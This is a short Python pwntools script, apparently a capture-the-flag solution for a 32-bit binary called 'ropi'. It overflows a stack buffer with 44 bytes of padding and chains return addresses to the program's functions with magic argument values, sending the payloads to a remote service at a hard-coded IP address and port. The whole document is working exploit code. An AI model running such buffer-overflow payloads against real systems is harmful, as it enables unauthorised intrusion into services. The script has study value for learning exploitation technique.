from pwn import *

context(log_level = "Debug", os = "linux", arch = "i386")
io = process("./ropi")
e = ELF("./ropi")
io = remote("114.55.66.54", 10001)
# gdb.attach(io)

payload = "A" * 44
payload += p32(e.sym['ret']) + p32(e.sym['main']) + p32(0xBADBEEEF)
io.sendline(payload)
io.recv()

payload = "A" * 44
payload += p32(e.sym['ori']) + p32(e.sym['pro']) + p32(0xABCDEFFF) + p32(0x78563412)
io.sendline(payload)

io.recvall()